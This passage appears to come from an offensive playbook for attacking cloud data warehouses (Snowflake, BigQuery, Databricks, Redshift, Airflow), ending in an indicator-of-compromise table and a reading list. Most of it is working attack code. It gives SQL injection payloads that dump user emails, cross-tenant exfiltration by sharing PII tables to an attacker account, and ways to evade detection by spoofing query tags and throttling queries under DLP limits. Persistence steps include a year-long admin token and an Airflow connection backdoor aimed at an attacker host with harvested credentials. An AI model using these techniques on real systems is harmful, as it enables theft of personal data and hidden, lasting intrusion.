## 32. Warehouse SQL Injection at Scale

### Snowflake SQLi via Filter Parameter

```bash
# BI dashboards often pass user-controlled filter to SQL like:
# SELECT * FROM sales WHERE region = '<INJECTED>'
# Inject:
' UNION SELECT current_user(), current_role(), NULL, NULL --

# Or pull from ACCOUNT_USAGE:
' UNION SELECT name, email, NULL, NULL FROM SNOWFLAKE.ACCOUNT_USAGE.USERS --
```

### BigQuery SQLi via bq Query String

```bash
# Many embedded BI tools concatenate filter values:
https://bi.target/dashboards/sales?region=US

# Backend:
# query = f"SELECT * FROM sales WHERE region = '{region}'"

# Inject (BigQuery supports CTEs and EXCEPT):
region=US' UNION ALL SELECT 'admin' AS region, '' AS sales --
```

### Stored Proc Injection

```sql
-- Snowflake stored procs (JavaScript/Python/Scala) can execute dynamic SQL
-- If input isn't sanitized, classic injection works:
CALL admin.run_user_query('user_input');
-- where run_user_query runs EXECUTE IMMEDIATE with concatenation
```

---

## 33. Cross-Tenant Exfiltration Patterns

### Snowflake Secure Data Sharing to Attacker Account

```sql
-- Step 1: Attacker has ACCOUNTADMIN on victim account
CREATE SHARE attacker_share;
GRANT USAGE ON DATABASE prod_db TO SHARE attacker_share;
GRANT USAGE ON SCHEMA prod_db.pii TO SHARE attacker_share;
GRANT SELECT ON TABLE prod_db.pii.customers TO SHARE attacker_share;
ALTER SHARE attacker_share ADD ACCOUNTS = 'attacker-account-id';

-- Step 2: Attacker creates database from share in their own account
CREATE DATABASE stolen FROM SHARE victim-account-id.attacker_share;
SELECT * FROM stolen.pii.customers LIMIT 1000;
```

### BigQuery Authorized Dataset to External Project

```bash
# Add attacker project to authorized list
bq update --source=schema.json acme-prod:pii

# schema.json:
{
  "access": [
    {"project": {"projectId": "attacker-proj", "datasetId": "exfil"}}
  ]
}
```

### Databricks Marketplace Listing Abuse

```bash
# Publish a "dataset" on Databricks Marketplace that
# secretly calls back when attached
# (requires provider account — sometimes purchased on the dark web)
```

---

## 34. Detection Evasion — QUERY_TAG Poisoning

### Blend with Periodic Job Tags

```sql
-- Find common periodic QUERY_TAGs in ACCOUNT_USAGE.QUERY_HISTORY
SELECT query_tag, count(*) AS n
FROM SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY
WHERE query_tag IS NOT NULL
GROUP BY 1 ORDER BY n DESC LIMIT 20;

-- Then set yours to match
ALTER SESSION SET QUERY_TAG='nightly_refresh_dag_backfill';
```

### Use Service Account Identity for Exfil

```sql
-- Impersonate a service account whose activity blends in
USE ROLE TRANSFORMER;
-- Transformer role executes tens of thousands of COPYs daily
```

### Time-of-Day Alignment

```bash
# Run exfil during the natural query peak (often 02:00-05:00 UTC for nightly jobs)
echo "Scheduled exfil at $(date -u -d 'tomorrow 03:00' +%H:%M)"
```

### Result-Set Throttling

```sql
-- Many DLP rules trigger on >10MB query results
-- Run 100 queries of 100KB each instead of one 10MB query
EXECUTE IMMEDIATE $$
DECLARE i INTEGER DEFAULT 0;
BEGIN
  FOR i IN 1 TO 100 LOOP
    SELECT * FROM PROD_DB.PII.USERS
    WHERE id BETWEEN i*1000 AND (i+1)*1000;
  END FOR;
END;
$$;
```

---

## 35. Persistence Patterns

### Snowflake Event Table for Persistent Exfil

```sql
-- Event tables stream logs to an external account
-- Tamper to add attacker as destination
ALTER ACCOUNT SET EVENT_LOG = attacker_event_table;
```

### Snowflake Resource Monitor Tamper

```sql
-- Tamper with credit monitor to mask consumption
ALTER RESOURCE MONITOR corp_monitor SET CREDIT_QUOTA = 999999;
```

### Databricks PAT with Long Lifetime

```bash
# Create a 1-year token from admin API
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/token-management/tokens" \
  -d '{"lifetime_seconds": 31536000, "comment": "engagement"}'
```

### Airflow Connection Backdoor

```python
# Add a connection pointing to attacker's "Snowflake" (a fake listener)
from airflow.models import Connection
from airflow.utils.session import create_session

with create_session() as session:
    c = Connection(conn_id='snowflake_default',
                   conn_type='snowflake',
                   host='attacker.proxy.example.com',
                   login='harvested_user',
                   password='harvested_pw')
    session.add(c)
```

---

## Reference — Cross-Platform Tooling Cheatsheet

| Task | Snowflake | Databricks | BigQuery | Redshift |
|---|---|---|---|---|
| Connect (CLI) | `snowsql` | `databricks-sql-cli` | `bq query` | `psql` |
| Connect (Python) | `snowflake-connector-python` | `databricks-sql-connector` | `google-cloud-bigquery` | `psycopg2` |
| Identity | SSO + key-pair | PAT + OAuth | SA key | IAM chaining |
| Recon schema | `INFORMATION_SCHEMA` | `SHOW DATABASES` | `INFORMATION_SCHEMA.TABLES` | `pg_catalog` |
| Recon access | `SHOW GRANTS` | `databricks secrets list-acls` | `bq get-iam-policy` | `pg_class.relacl` |
| Exfil | `COPY INTO @stage` | `dbutils.fs.cp` | `EXPORT DATA` | `UNLOAD` |
| Persistent | Event table | Long-lived PAT | Authorized dataset | Snapshot share |
| Hide activity | `QUERY_TAG` | Cluster log filter | Job label | `bimodal` queries |

---

## Indicator of Compromise (IOC) Patterns

| Pattern | Where to look | Likely attack |
|---|---|---|
| `ALTER SESSION SET QUERY_TAG` unexpected | `SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY` | Exfil blending |
| `COPY INTO @external_stage` from PII schema | Same as above | UNC5537-style exfil |
| `%python` cell touching `169.254.169.254` | Databricks cluster logs | IMDS theft |
| `CREATE SHARE` from new account | `SHOW SHARES` | Cross-tenant exfil |
| `dbt_cloud` API call from non-CI IP | dbt Cloud audit log | Token replay |
| Airflow Connection creation outside CI | Airflow audit log | Connection backdoor |
| BigQuery `EXPORT DATA` to unknown GCS | Cloud Audit Logs | Data exfil |
| Redshift `get-cluster-credentials` from new role | CloudTrail | Lateral to DB |

---

## Reference Reading

- Mandiant — *UNC5537: Snowflake Customer Breaches via Identity-Based Attacks* (2024-06)
- Snowflake Security Trust Center — *Threat Campaign Notices* (2024)
- Databricks — *Workspace Admin Best Practices* (2024)
- Google Cloud — *BigQuery Authorized Datasets & Views* (2024)
- AWS — *Best Practices for Redshift IAM Roles* (2024)
- dbt Labs — *CI/CD Token Security Guide* (2024)
- Apache Airflow — *Security Guide: Secrets Backends & FERNET_KEY* (2024)
- MITRE ATT&CK — *T1213 Data from Information Repositories*, *T1078.004 Cloud Accounts*
